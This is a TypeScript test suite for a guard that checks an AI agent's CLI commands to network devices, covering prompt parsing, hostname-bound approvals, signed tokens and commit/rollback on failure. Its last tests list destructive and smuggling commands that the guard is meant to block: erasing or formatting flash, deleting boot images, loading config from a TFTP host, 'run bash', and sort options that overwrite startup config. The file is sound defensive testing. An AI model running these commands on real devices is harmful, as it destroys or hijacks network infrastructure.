import { CONFIG_SESSIONS, PLATFORM_IDS, type PlatformId } from '@hopline/cli-model'
import { describe, expect, it } from 'vitest'
import { configPlan, deviceError, hostBound, hostnamesSetBy, modeChangeLine, promptState } from '@shared/cli'
import type { ExecResultMsg, PromptInfo } from '@shared/host-protocol'
import { checkProposal, configHint, runConfig, type LineKind } from '../src/main/agent/config-apply'
import { answerConfirmation, classify, detectMode, isConfirmationPrompt } from '@hopline/guard'
import { newKey, sign, verify } from '@shared/verdict'
import { bindingRefusal, hostRefusal } from '../src/session-host/guard-check'

/** An exec prompt and a configuration prompt per platform, as the device prints them. */
const PROMPTS: Record<PlatformId, { exec: string; config?: string }> = {
  ios: { exec: 'r1#', config: 'r1(config)#' },
  iosxe: { exec: 'core-sw1#', config: 'core-sw1(config)#' },
  nxos: { exec: 'leaf1#', config: 'leaf1(config)#' },
  iosxr: { exec: 'RP/0/RP0/CPU0:xr1#', config: 'RP/0/RP0/CPU0:xr1(config)#' },
  asa: { exec: 'asa1#', config: 'asa1(config)#' },
  c9800: { exec: 'wlc9800#', config: 'wlc9800(config)#' },
  aireos: { exec: '(wlc1) >' },
  ciscosb: { exec: 'sw1#', config: 'sw1(config)#' },
  ftd: { exec: '> ' },
  eos: { exec: 'dist-eos1#', config: 'dist-eos1(config)#' },
  junos: { exec: 'admin@mx1> ', config: '\n[edit]\nadmin@mx1# ' },
  panos: { exec: 'admin@PA-VM> ', config: '\n[edit]\nadmin@PA-VM# ' },
  fortios: { exec: 'FGT # ', config: 'FGT (interface) # ' },
  aoscx: { exec: 'cx1#', config: 'cx1(config)#' },
  vrp: { exec: '<HUAWEI>', config: '[~HUAWEI]' }
}

describe('profile prompts', () => {
  it.each(PLATFORM_IDS.map((p) => [p]))('%s: exec and config prompts are recognised, with the hostname', (p) => {
    const { exec, config } = PROMPTS[p]
    const e = promptState(`banner\r\n${exec}`, p)
    expect(e.mode === 'exec' || e.mode === 'user', `${p} exec: ${e.mode}`).toBe(true)
    if (config) expect(promptState(`x\r\n${config}`, p).mode).toBe('config')
    // An unidentified session accepts any platform's idle prompt.
    expect(promptState(`banner\r\n${exec}`, 'auto').mode).not.toBe('unknown')
  })

  it('logins, passwords, pagers and questions are never prompts, even for auto', () => {
    for (const line of ['Username: ', 'Password: ', 'login as: ', ' --More-- ', '---(more 42%)---', 'Proceed with reload? [confirm]', 'Enter passcode:'])
      expect(promptState(`x\r\n${line}`, 'auto').mode, line).toBe('unknown')
  })
})

describe('wrapper lines pass the session host in the mode the device shows', () => {
  it.each(PLATFORM_IDS.map((p) => [p]))('%s', (p) => {
    const s = CONFIG_SESSIONS[p]
    const { exec, config } = PROMPTS[p]
    for (const line of s.enter) expect(hostRefusal(line, p, 'config', exec), `${p} "${line}" at ${exec}`).toBeNull()
    if (!config) return
    for (const line of [...s.commit, ...s.exit, ...s.abort]) expect(hostRefusal(line, p, 'config', config), `${p} "${line}" at ${config}`).toBeNull()
  })
})

describe('disruptive confirmation: the hostname main asks for is the one the session host checks', () => {
  it.each(PLATFORM_IDS.map((p) => [p]))('%s', (p) => {
    for (const tail of [PROMPTS[p].exec, PROMPTS[p].config].filter((t): t is string => !!t)) {
      const shown = promptState(`x\r\n${tail}`, p).hostname
      expect(shown, `${p} ${tail}`).toBe(detectMode(p, `x\r\n${tail}`)?.hostname ?? '')
    }
  })

  it('a disruptive line runs with the shown hostname (any case), never with another or none', () => {
    const cases: [PlatformId, string, string][] = [
      ['iosxe', 'clear ip bgp *', 'core-sw1#'],
      ['eos', 'clear ip bgp *', 'dist-eos1#'],
      ['nxos', 'clear ip bgp *', 'leaf1#'],
      ['iosxe', 'switchport trunk allowed vlan 10', 'core-sw1(config-if)#']
    ]
    for (const [p, cmd, tail] of cases) {
      expect(classify(cmd, p, { mode: tail.includes('(config') ? 'config-any' : 'exec' }).kind, `${p} ${cmd}`).toBe('disruptive')
      const host = promptState(tail, p).hostname
      expect(hostRefusal(cmd, p, 'disruptive', tail, host)).toBeNull()
      expect(hostRefusal(cmd, p, 'disruptive', tail, host.toUpperCase())).toBeNull()
      expect(hostRefusal(cmd, p, 'disruptive', tail, 'other-host')).toMatch(/does not match/)
      expect(hostRefusal(cmd, p, 'disruptive', tail, '')).toMatch(/does not match/)
      expect(hostRefusal(cmd, p, 'config', tail)).toMatch(/without a typed confirmation/)
    }
  })

  it('FTD shows no hostname in its prompt, so nothing disruptive can be confirmed there (documented gap)', () => {
    expect(promptState('x\r\n> ', 'ftd').hostname).toBe('')
  })
})

describe('proposals', () => {
  it('Junos and VRP are wrapped in their own configuration model', () => {
    const j = checkProposal('junos', ['set interfaces ge-0/0/1 description uplink'])
    expect('plan' in j && [j.plan.before, j.plan.after]).toEqual([['configure private'], ['commit and-quit']])
    const v = checkProposal('vrp', ['interface GigabitEthernet0/0/1', 'description uplink'])
    expect('plan' in v && [v.plan.before, v.plan.after]).toEqual([['system-view'], ['commit', 'return']])
    const x = checkProposal('iosxr', ['interface GigabitEthernet0/0/0/1', 'description uplink'])
    expect('plan' in x && x.plan.after).toEqual(['commit', 'end'])
    const a = checkProposal('asa', ['interface GigabitEthernet0/1', 'description uplink'])
    expect('plan' in a && a.plan.before).toEqual(['configure terminal'])
  })

  it('FortiOS changes are balanced config … end blocks', () => {
    const ok = checkProposal('fortios', ['config system interface', 'edit port1', 'set description uplink', 'next', 'end'])
    expect('plan' in ok && [ok.plan.before, ok.plan.after]).toEqual([[], []])
    expect(checkProposal('fortios', ['config system interface', 'edit port1', 'set description x'])).toMatchObject({ decision: 'refused' })
    expect(checkProposal('fortios', ['set description x'])).toMatchObject({ decision: 'refused' })
    expect(configPlan('fortios', ['config system dns', 'end', 'end'])).toHaveProperty('error')
  })

  it('mode changes inside the lines are refused, in any abbreviation the device takes', () => {
    expect(modeChangeLine('iosxe', 'conf t')).toBe(true)
    expect(modeChangeLine('iosxe', 'exi')).toBe(true)
    expect(modeChangeLine('iosxr', 'commit')).toBe(true)
    expect(modeChangeLine('vrp', 'sysname core1')).toBe(false)
    expect(modeChangeLine('iosxe', 'encapsulation dot1q 10')).toBe(false)
    expect(checkProposal('junos', ['commit'])).toMatchObject({ decision: 'refused' })
    expect(checkProposal('iosxe', ['end'])).toMatchObject({ decision: 'refused' })
  })

  it('an unknown platform takes no proposals', () => {
    expect(checkProposal('auto', ['hostname x'])).toMatchObject({ decision: 'refused', reason: expect.stringMatching(/platform is unknown/) })
    expect(configHint('auto')).toMatch(/not known/)
    expect(configHint('junos')).toMatch(/"configure private" … <your lines> … "commit and-quit"/)
  })

  it('device errors come from the profile', () => {
    expect(deviceError('iosxe', "core-sw1(config)#descr x\n          ^\n% Invalid input detected at '^' marker.")).toMatch(/Invalid input/)
    expect(deviceError('junos', 'error: syntax error: foo')).toBeTruthy()
    expect(deviceError('eos', '% Incomplete command')).toBeTruthy()
    expect(deviceError('iosxe', 'Building configuration...\n[OK]')).toBeNull()
  })
})

/** A device that answers each line with `out(line)` and tracks the prompt it would show. */
function fakeRun(platform: PlatformId, out: (line: string) => string, prompt: (ran: readonly [string, LineKind | 'read'][]) => string) {
  const ran: [string, LineKind | 'read'][] = []
  return {
    ran,
    deps: {
      platform,
      exec: async (line: string, kind: LineKind | 'read'): Promise<ExecResultMsg> => {
        ran.push([line, kind])
        return { status: 'ok', output: out(line), durationMs: 1, bytes: 1 }
      },
      report: (_line: string, _kind: LineKind | 'read', r: ExecResultMsg) => r.output,
      prompt: async (): Promise<PromptInfo> => {
        const p = promptState(prompt(ran), platform)
        return { mode: p.mode, prompt: p.prompt, hostname: p.hostname }
      }
    }
  }
}

/** The prompt a device shows: exec before the enter line and after a line that leaves, config in between. */
const modal = (p: PlatformId, leaves: string[] = []) => (ran: readonly [string, LineKind | 'read'][]) => {
  const s = CONFIG_SESSIONS[p]
  let inConfig = false
  for (const [l] of ran) {
    if (s.enter.includes(l)) inConfig = true
    else if ([...s.exit, ...leaves, 'commit and-quit', 'exit configuration-mode', 'abort', 'end', 'return', 'exit'].includes(l)) inConfig = false
  }
  return inConfig ? PROMPTS[p].config! : PROMPTS[p].exec
}

describe('runConfig', () => {
  const plan = (p: PlatformId, lines: string[]) => {
    const c = checkProposal(p, lines, { user: 'admin' })
    if (!('plan' in c)) throw new Error(c.reason)
    return c
  }

  it('Junos: configure, the lines, commit and-quit', async () => {
    const c = plan('junos', ['set system host-name mx1'])
    const f = fakeRun('junos', () => '', () => '[edit]\nadmin@mx1# ')
    const r = await runConfig(f.deps, c, ['set system host-name mx1'])
    expect(r.applied).toBe(true)
    expect(f.ran.map((x) => x[0])).toEqual(['configure private', 'set system host-name mx1', 'commit and-quit'])
  })

  it('IOS-XR: a failure discards the target configuration with abort; nothing was committed', async () => {
    const lines = ['interface GigabitEthernet0/0/0/1', 'descripton x']
    const c = plan('iosxr', lines)
    const f = fakeRun('iosxr', (l) => (l === 'descripton x' ? "              ^\n% Invalid input detected at '^' marker." : ''), () => 'RP/0/RP0/CPU0:xr1(config-if)#')
    const r = await runConfig(f.deps, c, lines)
    expect(r).toMatchObject({ applied: false, partial: false })
    expect(f.ran.map((x) => x[0])).toEqual(['configure terminal', 'interface GigabitEthernet0/0/0/1', 'descripton x', 'abort'])
  })

  it('IOS: a failure part-way leaves with end and says the change is partial', async () => {
    const lines = ['interface Gi1/0/1', 'description a', 'bogus']
    const c = plan('iosxe', lines)
    const f = fakeRun('iosxe', (l) => (l === 'bogus' ? "% Invalid input detected at '^' marker." : ''), () => 'core-sw1(config-if)#')
    const r = await runConfig(f.deps, c, lines)
    expect(r).toMatchObject({ applied: false, partial: true })
    expect(f.ran.at(-1)![0]).toBe('end')
  })

  it('VRP commits only in two-stage mode', async () => {
    const c = plan('vrp', ['sysname core1'])
    const two = fakeRun('vrp', () => '', () => '[~HUAWEI]')
    await runConfig(two.deps, c, ['sysname core1'])
    expect(two.ran.map((x) => x[0])).toEqual(['system-view', 'sysname core1', 'commit', 'return'])
    const one = fakeRun('vrp', () => '', () => '[HUAWEI]')
    await runConfig(one.deps, c, ['sysname core1'])
    expect(one.ran.map((x) => x[0])).toEqual(['system-view', 'sysname core1', 'return'])
  })

  it('Junos: a failure discards the candidate with rollback 0 and leaves', async () => {
    const c = plan('junos', ['set foo'])
    expect(c.plan.abort).toEqual(['rollback 0', 'exit configuration-mode'])
    const f = fakeRun('junos', (l) => (l === 'set foo' ? 'error: syntax error: foo' : ''), () => '[edit]\nadmin@mx1# ')
    const r = await runConfig(f.deps, c, ['set foo'])
    expect(r).toMatchObject({ applied: false, partial: false, leftover: undefined })
    expect(f.ran.map((x) => x[0])).toEqual(['configure private', 'set foo', 'rollback 0', 'exit configuration-mode'])
  })

  it('PAN-OS: a failure cannot discard, and says what is left', async () => {
    const c = plan('panos', ['set deviceconfig system hostname fw1'])
    const f = fakeRun('panos', (l) => (l.startsWith('set') ? 'Invalid syntax.' : ''), () => '[edit]\nadmin@PA-VM# ')
    const r = await runConfig(f.deps, c, ['set deviceconfig system hostname fw1'])
    expect(r.applied).toBe(false)
    expect(r.leftover).toMatch(/revert/)
  })
})

describe('runConfig: a failed commit or leave is not applied (review H2)', () => {
  const plan = (p: PlatformId, lines: string[], user?: string) => {
    const c = checkProposal(p, lines, { user })
    if (!('plan' in c)) throw new Error(c.reason)
    return c
  }

  it('IOS-XR: "% Failed to commit" is not applied; the target config is discarded with abort and the session is back at exec', async () => {
    const c = plan('iosxr', ['hostname x'])
    const f = fakeRun('iosxr', (l) => (l === 'commit' ? "% Failed to commit one or more configuration items during a pseudo-atomic operation. All changes made have been reverted. Please issue 'show configuration failed [inheritance]' from this session to view the errors" : ''), modal('iosxr'))
    const r = await runConfig(f.deps, c, ['hostname x'])
    expect(r).toMatchObject({ applied: false, atExec: true })
    expect(r.reason).toMatch(/not committed/)
    expect(f.ran.map((x) => x[0])).toEqual(['configure terminal', 'hostname x', 'commit', 'abort'])
  })

  it('IOS-XR: "end" asking about uncommitted changes (refused, still in config) is not applied, and is discarded', async () => {
    const c = plan('iosxr', ['hostname x'])
    const f = fakeRun('iosxr', (l) => (l === 'end' ? 'Uncommitted changes found, commit them before exiting(yes/no/cancel)? [cancel]:' : ''), (ran) => (ran.some(([l]) => l === 'abort') ? PROMPTS.iosxr.exec : ran.length ? PROMPTS.iosxr.config! : PROMPTS.iosxr.exec))
    const r = await runConfig(f.deps, c, ['hostname x'])
    expect(r).toMatchObject({ applied: false, atExec: true })
    expect(f.ran.map((x) => x[0])).toEqual(['configure terminal', 'hostname x', 'commit', 'end', 'abort'])
  })

  it('PAN-OS: "Validation Error: … commit failed" is not applied', async () => {
    const c = plan('panos', ['set deviceconfig system hostname x'], 'admin')
    expect(c.plan.after).toEqual(['commit partial admin admin', 'exit'])
    const f = fakeRun('panos', (l) => (/^commit/.test(l) ? 'Validation Error:\n rulebase -> security is invalid\ncommit failed' : ''), modal('panos'))
    const r = await runConfig(f.deps, c, ['set deviceconfig system hostname x'])
    expect(r.applied).toBe(false)
    expect(r.leftover).toMatch(/revert/)
    expect(f.ran.map((x) => x[0])).toEqual(['show config diff', 'configure', 'set deviceconfig system hostname x', 'commit partial admin admin', 'exit'])
  })

  it('Junos: a commit check-out failure is not applied and rolls back only the private candidate', async () => {
    const c = plan('junos', ['set system host-name x'])
    const f = fakeRun('junos', (l) => (l === 'commit and-quit' ? "[edit interfaces]\n  'ge-0/0/9'\n    error\nerror: configuration check-out failed" : ''), (ran) => (!ran.length || ran.at(-1)![0] === 'exit configuration-mode' ? PROMPTS.junos.exec : PROMPTS.junos.config!))
    const r = await runConfig(f.deps, c, ['set system host-name x'])
    expect(r).toMatchObject({ applied: false, atExec: true })
    expect(f.ran.map((x) => x[0])).toEqual(['configure private', 'set system host-name x', 'commit and-quit', 'rollback 0', 'exit configuration-mode'])
  })

  it('VRP: "Error: The configuration fails to be committed." is not applied', async () => {
    const c = plan('vrp', ['sysname core1'])
    const f = fakeRun('vrp', (l) => (l === 'commit' ? 'Error: The configuration fails to be committed.' : ''), modal('vrp'))
    const r = await runConfig(f.deps, c, ['sysname core1'])
    // Two-stage: nothing was committed, so nothing is live (not "partially applied").
    expect(r).toMatchObject({ applied: false, partial: false })
    expect(f.ran.map((x) => x[0])).toEqual(['system-view', 'sysname core1', 'commit', 'return'])
  })

  it('VRP one-stage ([HUAWEI]): a failed line after another is partial (each line is live at once)', async () => {
    const lines = ['sysname core1', 'bogus']
    const c = plan('vrp', lines)
    const f = fakeRun('vrp', (l) => (l === 'bogus' ? 'Error: Unrecognized command found at \'^\' position.' : ''), (ran) => (ran.length && !ran.some(([l]) => l === 'return') ? '[HUAWEI]' : '<HUAWEI>'))
    const r = await runConfig(f.deps, c, lines)
    expect(r).toMatchObject({ applied: false, partial: true })
  })

  it('a session that is not back at exec after a success is reported', async () => {
    const c = plan('iosxe', ['hostname x'])
    const f = fakeRun('iosxe', () => '', () => PROMPTS.iosxe.config!)
    const r = await runConfig(f.deps, c, ['hostname x'])
    expect(r.atExec).toBe(false)
    expect(r.reason).toMatch(/still in config mode/)
  })

  it('re-syncs before each line: a device that left configuration mode stops the run', async () => {
    const lines = ['interface Gi1/0/1', 'description a']
    const c = plan('iosxe', lines)
    const f = fakeRun('iosxe', () => '', (ran) => (ran.length >= 2 ? PROMPTS.iosxe.exec : ran.length ? PROMPTS.iosxe.config! : PROMPTS.iosxe.exec))
    const r = await runConfig(f.deps, c, lines)
    expect(r.applied).toBe(false)
    expect(r.reason).toMatch(/left configuration mode before "description a"/)
    expect(f.ran.map((x) => x[0])).toEqual(['configure terminal', 'interface Gi1/0/1'])
  })
})

describe('shared candidates (review H4)', () => {
  const plan = (p: PlatformId, lines: string[], user?: string) => {
    const c = checkProposal(p, lines, { user })
    if (!('plan' in c)) throw new Error(c.reason)
    return c
  }

  it('Junos: a refused private session stops; plain "configure" is never tried', async () => {
    const c = plan('junos', ['set system host-name x'])
    const f = fakeRun('junos', (l) => (l === 'configure private' ? 'error: shared configuration database modified\nUsers currently editing the configuration:\n  bob terminal pts/1' : ''), () => PROMPTS.junos.exec)
    const r = await runConfig(f.deps, c, ['set system host-name x'])
    expect(r).toMatchObject({ applied: false, partial: false, atExec: true })
    expect(r.reason).toMatch(/another administrator has uncommitted changes/)
    expect(f.ran.map((x) => x[0])).toEqual(['configure private'])
  })

  it('PAN-OS: pending changes in the candidate stop the run before configure', async () => {
    const c = plan('panos', ['set deviceconfig system hostname x'], 'admin')
    const f = fakeRun('panos', (l) => (l === 'show config diff' ? '@@ -1,3 +1,4 @@\n+set address evil ip-netmask 1.2.3.4/32' : ''), () => PROMPTS.panos.exec)
    const r = await runConfig(f.deps, c, ['set deviceconfig system hostname x'])
    expect(r).toMatchObject({ applied: false, partial: false })
    expect(r.reason).toMatch(/already has uncommitted changes/)
    expect(f.ran).toEqual([['show config diff', 'read']])
  })

  it('PAN-OS: without an admin name in the prompt the proposal is refused (never a plain "commit")', () => {
    expect(checkProposal('panos', ['set deviceconfig system hostname x'])).toMatchObject({ decision: 'refused', reason: expect.stringMatching(/no admin name/) })
    expect(checkProposal('panos', ['set deviceconfig system hostname x'], { user: 'a b' })).toMatchObject({ decision: 'refused' })
  })

  it('PAN-OS: "commit partial admin <user>" passes the session host at the config prompt', () => {
    expect(hostRefusal('commit partial admin admin', 'panos', 'config', '\n[edit]\nadmin@PA-VM# ', undefined, ['PA-VM'])).toBeNull()
    expect(hostRefusal('show config diff', 'panos', 'read', 'admin@PA-VM> ')).toBeNull()
  })
})

describe('VRP leave question (review M3)', () => {
  it('"[Y(yes)/N(no)/C(cancel)]:" is a confirmation, answered N only for return', () => {
    const q = 'Warning: Uncommitted configurations found. Are you sure to commit them before exiting? [Y(yes)/N(no)/C(cancel)]:'
    expect(isConfirmationPrompt('vrp', q)).toBe(true)
    expect(answerConfirmation('vrp', 'return', q, { mode: 'config' })).toEqual({ answer: 'N\r', description: expect.stringMatching(/discard/) })
    expect(answerConfirmation('vrp', 'commit', q, { mode: 'config' })).toHaveProperty('refuse')
  })

  it('a return that still finds uncommitted changes after commit is reported not applied', async () => {
    const c = checkProposal('vrp', ['sysname core1'])
    if (!('plan' in c)) throw new Error(c.reason)
    const f = fakeRun('vrp', (l) => (l === 'return' ? 'Warning: Uncommitted configurations found. Are you sure to commit them before exiting? [Y(yes)/N(no)/C(cancel)]:N' : ''), modal('vrp'))
    const r = await runConfig(f.deps, c, ['sysname core1'])
    expect(r).toMatchObject({ applied: false, partial: false, atExec: true })
  })
})

describe('approvals are bound to the device (review M2)', () => {
  it('a config line runs only where the prompt shows an approved hostname', () => {
    expect(hostRefusal('hostname x', 'ios', 'config', 'r1(config)#', undefined, ['r1'])).toBeNull()
    expect(hostRefusal('hostname x', 'ios', 'config', 'OTHER-ROUTER(config)#', undefined, ['r1'])).toMatch(/device changed/)
    expect(hostRefusal('description x', 'iosxe', 'config', 'core-sw1(config-if)#', undefined, ['CORE-SW1'])).toBeNull()
    // A proposal that renames the device may continue under the new name.
    expect(hostnamesSetBy(['hostname core2', 'set system host-name mx2', 'sysname h2'])).toEqual(['core2', 'mx2', 'h2'])
    expect(hostRefusal('end', 'ios', 'config', 'core2(config)#', undefined, ['r1', 'core2'])).toBeNull()
    // A prompt without a hostname only matches a binding without one (FTD: documented gap).
    expect(hostBound([''], '')).toBe(true)
    expect(hostBound([''], 'x')).toBe(false)
    expect(hostBound(['fw1'], '')).toBe(false)
  })

  it('the hostname list is signed into the token', () => {
    const k = newKey()
    const t = sign(k, { tabId: 'a', command: 'hostname x', kind: 'config', platform: 'ios', hosts: ['r1'] })
    expect(verify(k, t, 'a', 'hostname x')?.hosts).toEqual(['r1'])
    const [b, sig] = t.split('.')
    const v = JSON.parse(Buffer.from(b!, 'base64url').toString())
    v.hosts = ['OTHER-ROUTER']
    expect(verify(k, Buffer.from(JSON.stringify(v)).toString('base64url') + '.' + sig, 'a', 'hostname x')).toBeNull()
  })
})

describe('the session host fails closed without a device binding (review M2)', () => {
  it('config and disruptive verdicts without hosts are refused; reads need none', () => {
    expect(bindingRefusal('config', undefined)).toMatch(/not bound to a device/)
    expect(bindingRefusal('disruptive', [])).toMatch(/not bound to a device/)
    expect(bindingRefusal('config', ['r1'])).toBeNull()
    expect(bindingRefusal('config', [''])).toBeNull()
    expect(bindingRefusal('read', undefined)).toBeNull()
  })
})

describe('Junos "configure private" is a config command, but never runs as an agent line (review H4)', () => {
  it('a proposal containing it is refused as a mode change; it is not a read', () => {
    expect(checkProposal('junos', ['configure private'], { user: 'admin' })).toMatchObject({ decision: expect.stringMatching(/refused|blocked/) })
    expect(classify('configure private', 'junos').kind).toBe('config')
    expect(classify('configure exclusive', 'junos').kind).toBe('blocked')
  })
})

describe('verdict tokens (review)', () => {
  it('bind tab, command, time and key; tampering breaks them', () => {
    const k = newKey()
    const t = sign(k, { tabId: 'a', command: 'show version', kind: 'read', platform: 'ios' })
    expect(verify(k, t, 'a', 'show version')).toBeTruthy()
    expect(verify(k, t, 'b', 'show version')).toBeNull()
    expect(verify(k, t, 'a', 'reload')).toBeNull()
    expect(verify(k, t, 'a', 'show version', Date.now() + 61_000)).toBeNull()
    expect(verify(newKey(), t, 'a', 'show version')).toBeNull()
    const [b, sig] = t.split('.')
    const v = JSON.parse(Buffer.from(b!, 'base64url').toString())
    v.kind = 'disruptive'
    expect(verify(k, Buffer.from(JSON.stringify(v)).toString('base64url') + '.' + sig, 'a', 'show version')).toBeNull()
  })
})

describe('exec commands inside config proposals (review H1, main and host)', () => {
  it.each([
    ['asa', 'asa-edge1(config)# ', ['reload noconfirm', 'delete /noconfirm disk0:/asa.bin', 'copy /noconfirm tftp://10.0.0.9/evil.cfg startup-config', 'changeto system', 'write erase', 'format noconfirm disk0:']],
    ['nxos', 'leaf1(config)# ', ['delete bootflash:nxos.bin no-prompt', 'copy tftp://10.0.0.9/x startup-config vrf management', 'reload', 'run bash']]
  ] as const)('%s', (p, prompt, cmds) => {
    for (const c of cmds) {
      expect(checkProposal(p, [c]), `${p} ${c}`).toMatchObject({ decision: 'blocked' })
      expect(hostRefusal(c, p, 'config', prompt), `${p} ${c}`).toMatch(/refused by session host/)
    }
  })
})

describe('Linux pipe filters on the read path of the session host (review C1)', () => {
  it.each(['show running-config | sort --o=/mnt/flash/startup-config', "show running-config | sort '-o' /mnt/flash/startup-config", 'show running-config | sort -\\o /mnt/flash/startup-config', 'show version | sort --compress=bash'])('%s', (c) => {
    expect(hostRefusal(c, 'eos', 'read', 'dist-eos1#')).toMatch(/refused by session host/)
  })
  it('IOS-XE to-file is refused too (M1)', () => expect(hostRefusal('show logging process iosrp to-file bootflash:x', 'iosxe', 'read', 'sw1#')).toMatch(/refused/))
})
